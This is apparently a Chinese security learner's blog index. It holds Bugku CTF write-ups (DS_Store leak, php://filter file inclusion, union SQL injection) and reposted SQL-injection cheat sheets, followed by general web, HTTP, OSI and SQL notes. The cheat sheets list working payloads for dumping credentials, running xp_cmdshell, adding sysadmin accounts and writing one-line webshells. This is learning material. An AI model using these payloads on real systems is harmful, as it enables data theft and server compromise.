    <title><![CDATA[WP-Bugku-sql注入2]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-sql%E6%B3%A8%E5%85%A52%2F</url>
    <content type="text"><![CDATA[题目地址：http://120.24.86.145:8007/web2/ 这道题是DS_Store源码泄露常见Web源码泄露总结ds_store_exp下载用DS_Store_exp扫描改网址：进入http://120.24.86.145:8007/web2/flag下载得到flag{sql_iNJEct_comMon3600!}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>DS_Store源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP函数漏洞]]></title>
    <url>%2F2018%2F08%2F08%2FPHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[偶然看见网上总结比较全面的PHP函数漏洞，先码住传送门：https://blog.csdn.net/qq_35078631/article/details/75200157]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-flag在index里]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FWeb%2FWP-Bugku-flag%E5%9C%A8index%E9%87%8C%2F</url>
    <content type="text"><![CDATA[题目地址： http://120.24.86.145:8005/post/ 进入题目后看到只有一个可点击的文字点击之后跳转到http://120.24.86.145:8005/post/index.php?file=show.php 想到题目是：flag在index里那么可能是文件包含构造url：http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php得到了一串base64加密的字符串base64解密得到包含flag的代码得到flag{edulcni_elif_lacol_si_siht}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap常规使用]]></title>
    <url>%2F2018%2F08%2F08%2Fsqlmap%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>笔记</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL手工注入常用语句]]></title>
    <url>%2F2018%2F08%2F07%2FSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[文章来源：暗组 判断数据库类型:Access:and (select id from MSysAccessObjects) &gt;0 返回正常说明是access MSSQL:and (select id from sysobjects) &gt;0 返回正常说明是mssql MySQL:and length(user())&gt;0 返回正常说明是MySQL mysql： 1.判断版本 and ord(mid(version(),1,1))&gt;51 / 返回正常说明是4.0以上版本，可以用union查询2.利用order by 暴字段，在网址后加 order by 10 / 如果返回正常说明字段大于103.再利用union来查询准确字段，如: order by 或者and 1=2 union select 1,2,3,……./直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。4.判断数据库连接帐号有没有写权限，and (select count() from mysql.user)&gt;0 /如果结果返回错误，那我们只能猜解管理员帐号和密码了。5.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 / 注：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。 6、检测是不是root权限 and/*/ord(mid(user(),1,1))=114/ 7、mysql内置函数hex()转换字符为16进制，如select hex(user())mysql内置函数unhex() 解码16进制，如select unhex(hex(user())) 8、mysql内置函数concat()将多列合并成一列，如select concat(username,0x3A,password) from t_member 9、常用内置函数使用：select system_user() 查看系统用户 select current_user() 查询当前用户 select user() 查询用户 SELECT version() 查询数据库版本 SELECT database() 查询当前连接的数据库 select @@version_compile_os 查询当前操作系统 select @@datadir 查询读取数据库路径select @@basedir 查询MYSQL安装路径 ———————-淫荡的分割线——————————————— 去掉limit 1,1为查询出所有行，第一个数字代表查询第几个，第二个数字代表一次查询出的数量第一个数字从1开始递增，查询到3时浏览器返回错误，说明存在2个库/表。 10、查数据库数量union select cuncat(schema_name,0x3A) from information_schema.schemata limit 1,1 11、查询表union select table_name from information_schema.tables where table_schema =库名 limit 1,1 MSSQL： 检测是否为SA权限and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));– 检测是否为DB权限and 1=(Select IS_MEMBER(‘db_owner’)) 爆所有数据库 union select name from master.dbo.sysdatabases where dbid=1 1代表第一个库 爆所有表第一张表 union select top 1 name from 库名.dbo.sysobjects where xtype=’U’ 第二张表 union select top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’) 第三张表 union select top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’,’第二张表’)… 爆列：爆ID select id from seay.dbo.sysobjects where xtype=’U’ and name=’admin’ 爆第一个列 select top 1 name from seay.dbo.syscolumns where id=ID号 爆第二个列 select top 1 name from seay.dbo.syscolumns where id=ID号 and name not in(‘第一个列’)… 爆数据：select 列名 from 表名 exec master.dbo.xp_dirtree ‘c:\’; 遍历目录exec master.dbo.xp_availablemedia;– 获得当前所有驱动器exec master.dbo.xp_subdirs ‘c:\’;– 获得子目录列表exec master.dbo.xp_dirtree ‘c:\’;– 获得所有子目录的目录树结构exec master.dbo.xp_cmdshell ‘type c:\web\web.config’;– 查看文件的内容 备份数据库：backup database 库名 to disk=’c:/l.asp’; MSSQL内置函数：select @@version 查询数据库版本 select user_name() 查询当前数据库连接用户名 select db_name() 查询当前数据库名 更改sa密码exec sp_password NULL,’新密码’,’sa’ 添加SA权限用户exec sp_addlogin ‘username’,’pass’,’master’;exec sp_addsrvrolemember ‘username’, sysadmin 检测是否支持多行;declare @d int;– 停掉或激活某个服务。 exec master..xp_servicecontrol ‘stop’,’schedule’exec master..xp_servicecontrol ‘start’,’schedule’ 解开压缩档。 xp_unpackcab ‘c:\test.cab’,’c:\temp’,1 恢复 xp_cmdshell;exec master..dbo.sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’;– 开启沙盘模式：exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>Web</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-成绩单]]></title>
    <url>%2F2018%2F08%2F05%2FWriteup%2FWeb%2FWP-Bugku-%E6%88%90%E7%BB%A9%E5%8D%95%2F</url>
    <content type="text"><![CDATA[题目地址：http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#得到表名fl4g,sc 关于mysql中group_concat(),information_schema 很显然我们需要的数据在fl4g这个表里 接下来我们就要爆字段了 通过id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#//这里需要用16进制绕过得到字段skctf_flag 关于用16进制绕过(引号绕过)以及详细资料 最后我们就可以开始查询数据了 通过id=-1&#39; union select 1,2,3,skctf_flag from fl4g#得到BUGKU{Sql_INJECT0N_4813drd8hz4} mysql中的information_schema 结构用来存储数据库系统信息information_schema 结构中这几个表存储的信息，在注射中可以用到的几个表。 | SCHEMATA ――&gt;存储数据库名的，|——&gt;关键字段：SCHEMA_NAME，表示数据库名称| TABLES ――&gt;存储表名的|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称；TABLE_NAME表示表的名称| COLUMNS ――&gt;存储字段名的|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称；TABLE_NAME表示所属的表的名称 COLUMN_NAME表示字段名可以看到，我们只要通过注射点构造查询语句遍相关字段，就可以得到我们想要的信息了。爆所有数据名select group_concat(SCHEMA_NAME) from information_schema.schemata得到当前库的所有表select group_concat(table_name) from information_schema.tables where table_schema=database()得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572得到字段具体的值select group_concat(username,0x3a,password) from adminuser]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常规SQL注入笔记]]></title>
    <url>%2F2018%2F07%2F25%2F%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[转载自http://599985375.lofter.com/post/1d071723_7b32422 基本常识简单判定有无漏洞： 粗略型：提交单引号’ 逻辑型（数字型注入）：and 1=1/and 1=2 逻辑型（字符型注入）：’ and ‘1’=’1/‘ and ‘1’=’2 逻辑型（搜索型注入）：%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’% 简单判断数据库信息：粗略型： 加单引号’（根据服务器报错的信息来判断） 加;–（;表示分离，– 则是注释符，;和–MSSQL数据库有，ACCESS数据库没有） 逻辑型： and user&gt;0 and (select count(*) from msysobjects)&gt;0 ……（页面错误为access数据库） and (select count(*) from sysobjects)&gt;0 ……（页面正常为MSSQL数据库） and db_name()&gt;0 ……（爆数据库名） and version&gt;0（爆SQLServer版本信息以及服务器操作系统的类型和版本信息） 判断MYSQL权限： and 0&lt;&gt;（Select ISSRVROLEMEMBER（’sysadmin’））–（页面正常则为SA） and 0&lt;&gt;（Select IS_MEMBER（’db_owner’））–（页面正常则为db_owner） and 0&lt;&gt;（Select IS_MEMBER（’public’））–（页面正常则是public）注意：以上方法适用于参数是int数字型的时候。若为字符型，需在参数后添加单引号’并在查询语句后添加;–，搜索型注入以此类推。 ACCESS注入基本流程：猜解表名： and 0&lt;&gt;(select count() from 表名) 或 and exists（Select from 表名）猜解字段： and exists（Select 字段名 from 表名）（页面正常存在该字段，不正常不存在该字段）猜解用户名和密码长度： and（Select top 1 len（列名） from 表名）&gt;N（TOP表示把最前面的一条记录提取出来；N为变换猜解的列长度，页面错误即说明该列长度为N）如： and 1=(select count(*) from user where len(name)&gt;6) 错误 and 1=(select count(*) from user where len(name)&gt;5) 正确则表示user表中name字段的第一条记录的长度是6。 猜解用户名和密码： and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;0如： and (select top 1 asc(mid(name,1,1)) from user)&gt;96 页面正常 and (select top 1 asc(mid(name,1,1)) from user)&gt;97 页面错误则表示user表中name字段的第一条记录的第一个字符的ASCLL码为97注意：因为MD5的密文长度通常有16位、18位、32位、40位等几种，所以猜解密码的时候试一试15、16、17、18、31、32、39、40等长度可以加快猜解进度。 MSSQL报错注入基本流程：爆出表名和字段：having 1=1– 猜解表名： 获得第一个表名：and (select top 1 name from sysobjects where xtype=’u’)&gt;0 获得第二个表名：and (select top 1 name from sysobjects where xtype=’u’ and name not in (‘user’))&gt;0 以此类推。 猜解列名： 得到col_name表中的第一个列名：and (select top 1 col_name(object_id(‘字段’),1) from sysobjects)&gt;0 猜解字段内容：and (select top 1 列名 from [表名])&gt;0 如： 获取用户名：and (select top 1 username from [admin])&gt;0 获取密码：and (select top 1 password from [admin])&gt;0 导出webshell： 方法1：利用SQL执行命令功能导出WebShell SELECT ‘&lt;%execute request(“a”)%&gt;’ into [vote] in ‘d:webx.asp;.xls’ ‘excel 8.0;’ from vote 注意：需拥有SQL执行权限且知道绝对路径 方法2： 建立一个有一个A字段的表 表名为a，字段类型为字符，长度为50。 在表A的a字段插入一句话木马，把表a的内容导出为物理路径的一个EXCEL文件。 导出为EXCEL后在利用IIS解析漏洞就可以变成webshell了。 方法2的SQL语句： create table cmd (a varchar(50)) insert into cmd (a) values (‘&lt;%execute request(“listentide”)%&gt;’) select * into [a] in ‘f:hostqhdyxtweba.asp;.xls’ ‘excel 4.0;’ from cmd drop table cmd MYSQL注入基本流程：MYSQL注入漏洞是否存在的判断方法与ACCESS注入和MSSQL注入相同。 MYSQL注入漏洞的数据库类型判断方法也可以使用单引号’。 数据库权限判断：and ord(mid(user(),1,1))=114 /* （页面正常说明为root） 判断当前页面字段总数： 方法1、用union联合查询：and 1=1 union select 1,2,3,4,5…… 方法2、用order by 查询“order by *– 判断显示位： 方法1、http://www.f4ck.org/article.php?id=1 and 1=2 union select 1,2,3,4,5,6,7…… 方法2、http://www.f4ck.org/article.php?id=-1 union select 1,2,3,4,5,6,7…… 查库： 版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。 获取第一个库名：and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 获取第二个库名：and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 1,2 以此类推。 查表： 获取数据库中第一个表名：and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 0,1 获取数据库中第二个表名：and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 1,2 查列： 获取数据库中指定表的第一个列名：and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1 获取数据库中指定表的第二个列名：and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1 得到字段内容： 在不同的显示位显示不同的字段内容：and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1 在同一个显示位显示不同的字段内容：and 1=2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1 一次性查出所有表名：union select 1,2,3,4,GROUP_CONCAT(DISTINCT table_name),6 from information_schema.columns where table_schema=数据库名的16进制 一次性查出所有字段名：union select 1,2,3,4,GROUP_CONCAT(DISTINCT column_name),6 from information_schema.columns where table_schema=数据库名的16进制 导出一句话WebShell： 方法1： Drop TABLE IF EXISTS temp; Create TABLE temp(cmd text NOT NULL); Insert INTO temp (cmd) VALUES(‘’); Select cmd from temp into out file ‘F:/wwwroot/eval.php’; Drop TABLE IF EXISTS temp; 方法2： Select ‘’ into outfile ‘F:/wwwroot/eval.php’; load_file() 常用路径： c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件 c:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf 查看WINDOWS系统apache的配置文件 c:/Resin-3.0.14/conf/resin.conf查看jsp开发的网站 resin文件配置信息]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>Web</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web常见漏洞及分析]]></title>
    <url>%2F2018%2F07%2F22%2FWeb%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[XSS 漏洞（Cross Site Script | 跨站脚本）常见危害： 盗取用户信息，钓鱼，制造蠕虫等概念： 黑客通过“ Html 注入”篡改网页，插入了恶意脚本，当用户在浏览网页时，实现控制用户浏览器的一种攻击方式 XSS 通常有三种类型： 存储型：访问网站，触发XSS。firebug 的 html 中查找黑客端攻击流程： 构造带有 XSS 脚本的留言内容 –&gt; 提交给后端 web 应用程序 –&gt; web 应用程序将带有 XSS 脚本的留言写入数据库 –&gt; 用户或管理员查看留言触发 XSS用户端被攻击流程： 用户打开浏览器 –&gt; 访问了有 XSS 脚本的留言页面 –&gt; 浏览器请求内容 –&gt; 查询数据库 –&gt; 数据库将带有 XSS 脚本的留言返回给 web 应用程序 –&gt; 显示在用户的页面中触发 XSS例：留言中加入 &lt;img src=&quot;#&quot; onerrror=alert(/XSS/)&gt; 反射性：访问携带 XSS 脚本的连接，触发 XSS用户端被攻击流程： 用户访问了有XSS脚本的链接 –&gt; 浏览器向后端的web应用程序发送请求 –&gt; 后端程序将 url 中的 XSS 脚本数据写入到响应页面并返回给浏览器 –&gt; 浏览器渲染响应页面触发 XSS例： url 中携带 &lt;img src=&quot;#&quot; onerror=&quot;alert=(/XSS/)&quot;&gt; DOM 型： 访问携带 XSS 脚本的链接，触发XSSfirebug 脚本中查找“ hash ”攻击过程： 用户在浏览器中访问携带XSS脚本的链接 –&gt; 浏览器通过 javascript 从 url 中提取出 XSS 脚本的内容并写入到 DOM 中 –&gt; 触发 XSS CSRF 漏洞（Cross-site request forgery | 跨站请求伪造）常见危害： 执行恶意操作（“被转账”、“被发垃圾评论”），制造蠕虫等概念： 利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。原理：在转账页面可能存在看不见的 iframe 标签，因为 width 和 height 为0 URL 跳转漏洞概念： 借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致安全问题例如：实现方式： Header 头跳转 JavaScript 跳转 Meta 跳转 SQL 注入SQL 注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以进行访问或修改数据，或者利用潜在的数据库漏洞进行攻击SQL 注入的必备条件 1、可以控制输入的数据 2、服务器要执行的代码拼接了控制的数据SQL 注入的本质 数据和代码未分离，即数据当作了代码来执行 命令注入命令注入要满足三个条件： 1、调用可执行系统命令的函数 2、函数或函数的参数可控 3、拼接注入命令PHP执行命令的函数：system, exec, shell_exec, eval ……PHP执行系统命令的函数： system() 输出并返回最后一行shell结果。exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[submit text 3初始配置]]></title>
    <url>%2F2018%2F07%2F13%2Fsubmit-text-3%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[submit text 3安装PyV8有时下载 Emmet 后，使用会报出关于 PyV8 的错误这时需要我们手动去安装 PyV8 1、在github上下载需要的包：传送门 2、把下载的压缩包解压到如下路径： 3、重启submit text 3即可 submit text 3在浏览器中预览html等文件 1、安装插件：“view in browser” 2、打开：“Preferences-&gt;Key Bindings-User”，输入如下内容：[ { &quot;keys&quot;: [&quot;ctrl+alt+f&quot;], &quot;command&quot;: &quot;open_in_browser&quot; },] submit text 3在指定路径下在浏览器中预览 1、安装插件：“SideBarEnhancements” 2、打开：“Preference-&gt;Package Settings-&gt;Side Bar-&gt;Settings User-User”，添加如下：123&#123; "default_browser": "chrome" //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari&#125; 3、在侧边栏右键，找到“Project-&gt;Edit Preview URLs”，添加如下：123456&#123; "项目路径":&#123; "url_testing": "localhost地址", "url_production": "线上地址" &#125;&#125; 4、打开：“Preference-&gt;Package Settings-&gt;Side Bar-&gt;key Bindings-User”，添加如下：1234567891011[&#123; "keys": ["ctrl+shift+f"], "command": "side_bar_open_in_browser", "args": &#123; "paths": [], "type": "testing", "browser": "" &#125; &#125;]]]></content>
      <tags>
        <tag>submit text 3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web基础知识]]></title>
    <url>%2F2018%2F07%2F11%2Fweb%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Url组成 HTTP请求方式HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URL制定的资源的不同操作方式，具体介绍如下： 1、OPTIONS: 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送”*”的请求来测试服务器的功能性。 2、HEAD: 向服务器索要与个体请求相一致的响应，只不过响应将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 3、GET: 向特定的资源发出请求。 4、POST: 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 5、PUT: 向指定资源位置上传其最新内容。 6、DELETE: 请求服务器删除Request-URL所标识的资源。 7、TRACE: 回显服务器收到的请求，主要用于测试或诊断。 8、CONNECT: HTTP/1.1协议中预留给能够将连接改为管道的代理服务器。 GET和POST的区别 table th:first-of-type { width:10%; } GET POST 后退/刷新 无害 数据会被重新提交 书签 可收藏为书签 不可收藏为书签 缓存 能被缓存 不能缓存 编码类型 Application/x-www-form-urlencoded Application/x-www-form-urlencoded或multiparty/form-data。为二进制数据使用多重编码 历史 参数保存在浏览器历史中 参数不会保存在浏览器历史中 对数据长度的限制 当发送数据时，GET方法向URL添加数据；URL的长度是受限制的（URL的最大长度是2048个字符） 无限制 对数据类型的限制 只允许ASCII字符 没有限制。也允许二进制数据 安全性 与POST相比，GET的安全性较差，因为所发送的数据是URL的一部分。所以在发送密码等 敏感信息时绝不要使用GET。 POST比GET更加安全，因为参数不会被保存在浏览器历史或web服务器日志中。 可见性 数据在URL中对所有人都都是可见的 数据不会显示在URL中 Javascript由哪几部分组成参考来源：https://www.jianshu.com/p/f6c94cfa3139 虽然JavaScript和ECMAScript通常被人用来表达相同的意思，但JavaScript的含义去比ECMA-262中规定的多得多。一个完整的JavaScript实现应由三个部分组成： 1.核心（ECMAScript） 2.文档对象模型（DOM） 3.浏览器对象模型（BOM） 核心（ECMAScript） 由ECMA-262定义的ECMAScript是一种在国际认可的标准的脚本语言规范，与Web浏览器没有依赖关系。ECMA-262标准主要规定了这门语言由以下组成部分： 1.语法 2.变量和数据类型 3.关键字和保留字 4.操作符 5.控制语句 6.对象 2009年ECMAScript 5.0版正式发布。在很长一段时间，使用javaScript都是按照5.0的标准。2015年ECMAScript 6发布正式版本，官方称为ECMAScript 2015。ECMAScript定义了脚本语言的所有属性、方法和对象。因此抵用web客户端脚本编码时一定要遵循ECMAScript标准。 文档对象模型（DOM） DOM（文档对象模型）是 HTML 和 XML 的应用程序接口（API）。DOM 将把整个页面规划成由节点层级构成的文档。HTML或XML页面中的每个组成部分都是某种类型的节点，这些节点又包含着不同类型的数据。 浏览器对象模型（BOM） IE 3.0 和 Netscape Navigator 3.0 提供了一种特性 - BOM（浏览器对象模型），可以对浏览器窗口进行访问和操作。使用 BOM，开发者可以移动窗口、改变状态栏中的文本以及执行其他与页面内容不直接相关的操作。 OSI模型：（即开放式通信系统互联参考模型）OSI/RM协议是由IOS（国际标准化组织）制定的，他有三个基本功能：提供给开发者一个必须的、通用的概念以便开发完善、可以用来解释不同系统的框架。 OSI将计算机网络体结构划分为七层： 物理层：将数据转化为可通过物理介质传送的电子信号。相当于有剧中的搬运工人。物理层规定了激活、维持、关闭通信端点之间的机械性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的物理媒体。在这一层，数据单位为比特（bit）。属于物理层定义的典范规范代表包括：EIA/TIA RS-232、EIA/TIA RS-449、V.35、RJ-45等。 数据链路层：决定访问网络介质的方式。在此层将数据分帧，并处理流控制。本层指定拓补结构并提供硬件寻址。相当于邮局中的拆装箱工人。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。在这一层，数据的单位成为帧。数据链路层协议的代表包括：SDLC、HDLC、PPP、STP、帧中继等。 网络层：使用权数据路由经过大型网络。相当于邮局中的排序工人。网络层负责对子网间的数据包进行路由选择。网络层还可以实现拥塞控制、网际互联等功能。在这一层数据的单位成为数据包。网络层协议的代表包括：IP、PX、IP、SPF、RP、ARP、CMP、MP等。 传输层：提供终端到终端的可靠连接。相当于公司中跑邮局的送信职员。传输层是第一个端到端，即主机到主机的层次。传输层负责将数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。在这一层输局的单位称为数据端。传输层协议的代表包括：TCP、UDP、SPX等。 会话层：允许用户使用简单易记的名称建立连接。相当于公司中收寄信、写信封与拆信封的秘书。会话层管理主机之间的会话进程即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。 表示层：协商数据交换格式。相当于公司中简报老板、替老板写信的助理。表示层对上层数据或信息进行变换以保证一个主机应用层的信息可以被另一个主机的应用程序理解。表示层的数据转换包括输局的加密、压缩、格式转换等。 应用层：用户的应用程序和网络之间的接口老板。应用层为操作系统或网络应用程序提供访问网络服务的接口。应用层协议的代表包括：Telnet、FTP、HTTP、SNMP等。 TCP三次握手，四次挥手TCP三次握手：第一次握手：客户端发送syn包（syn=x）到服务器，并进入到SYN_SEND状态，等待服务器确认。 第二次握手：服务器收到syn包，必须确认客户端的SYN（ack=x+1），同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。 第三次握手：客户端收到服务区的SYN+ACK包，向服务器发送确认包ACK（ack=y+1），此包发送完毕，客户端进入ESTABLISHED状态，完成三次握手。 握手构成中传送的包里不含数据，三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP连接一旦建立，在通信双方的任何一方主动关闭连接前，TCP链接都将被一直保持下去。确认号：其数值等于发送方的发送序号+1（即接收方期望接受的下一个序列号）。 TCP四次挥手：第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送。 第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN展映一个序号）。 第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发送数据。 第四次挥手：主动关闭方收到一个FIN包后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>笔记</tag>
        <tag>url</tag>
        <tag>HTTP</tag>
        <tag>Javascript</tag>
        <tag>OSI模型</tag>
        <tag>TCP三次握手，四次挥手</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL常用语句--增删改查]]></title>
    <url>%2F2018%2F07%2F02%2FSQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[查 查全部： select * from &lt;tablename&gt;;条件查询：select &lt;filed&gt; from &lt;tablename&gt; where &lt;field&gt;=&lt;key&gt;;带有函数查询： select count(*) from &lt;tablename&gt;;模糊查询： select &lt;field&gt; from &lt;tablename&gt; where &lt;field&gt; like ‘%value%’; 增 添加库： create database &lt;databasename&gt;;创建新表： create table &lt;tablename&gt; (col1 type1, col2, ...); 主键自增： create table test1(id int primary key auto_increment,name varchar(20))auto_increment=1;插入数据： insert into &lt;tablename&gt;(field1,field2……) values(value1,value2………);增加一列： alter table &lt;tablename&gt; add column &lt;colname&gt; &lt;coltype&gt;;添加主键： alter table &lt;tablename&gt; add primary key(col); 改 更新： update &lt;tablename&gt; set &lt;field&gt;=&lt;value&gt; where &lt;条件&gt;; 删 删除库： drop database &lt;databasename&gt;;删除表： delete from &lt;tablename&gt; where &lt;条件&gt;;（会留下日志文件，能被还原修复）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;truncate table &lt;tablename&gt;;（不会留下日志文件，不能被还原修复） 子句： where子句：= , &gt; , &lt; , &lt;&gt;(不等于) , &gt;= , &lt;=order by子句：asc (升序) , desc(降序)]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页返回上一页的几种方法]]></title>
    <url>%2F2018%2F07%2F01%2F%E9%A1%B5%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%B8%80%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[以按钮点击的方式实现 &lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:window.history.back(-1);&quot;&gt;或者&lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:history.back(-1);&quot;&gt; 一点击图片的方式实现 &lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:window.history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt;或者&lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt; 文字点击的方式实现 &lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回上一页&lt;/a&gt;或者&lt;a href=&quot;#&quot; onClick=&quot;javascript:history.back(-1);&quot;&gt;返回上一页&lt;/a&gt; 图片链接的方式实现 &lt;a href=&quot;javascript:window.history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt;或者&lt;a href=&quot;javascript:history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt; 过几秒钟后返回上一页 &lt;script 